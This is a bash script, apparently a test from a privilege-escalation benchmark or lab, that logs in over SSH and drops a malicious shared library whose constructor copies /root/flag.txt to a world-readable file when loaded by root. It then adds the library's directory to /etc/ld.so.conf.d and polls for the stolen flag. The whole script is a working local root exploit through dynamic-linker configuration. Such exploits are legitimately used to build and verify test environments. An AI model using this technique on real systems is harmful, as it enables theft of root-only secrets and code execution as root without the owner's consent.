#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat >/tmp/evil.c <<'"'"'EOF'"'"'
#include <fcntl.h>
#include <unistd.h>
__attribute__((constructor)) void init(void) {
  if (geteuid() != 0) return;
  int in = open("/root/flag.txt", O_RDONLY);
  int out = open("/tmp/ldconfflag", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (in >= 0 && out >= 0) {
    char buf[256];
    ssize_t n;
    while ((n = read(in, buf, sizeof buf)) > 0) {
      (void)write(out, buf, (size_t)n);
    }
  }
  if (in >= 0) close(in);
  if (out >= 0) close(out);
}
EOF
rm -f /tmp/ldconfflag
gcc -shared -fPIC -o /usr/local/lib/benchevil/libevil.so /tmp/evil.c
printf "%s\n" /usr/local/lib/benchevil > /etc/ld.so.conf.d/bench.conf
chmod 666 /etc/ld.so.conf.d/bench.conf
for _ in $(seq 1 30); do
  if [ -s /tmp/ldconfflag ]; then
    cat /tmp/ldconfflag
    exit 0
  fi
  sleep 1
done
echo "ld.so.conf payload was not triggered" >&2
ls -la /etc/ld.so.conf.d/bench.conf /usr/local/lib/benchevil/libevil.so /tmp/ldconfflag 2>&1 >&2 || true
exit 1
')"
assert_root_output "${out}"
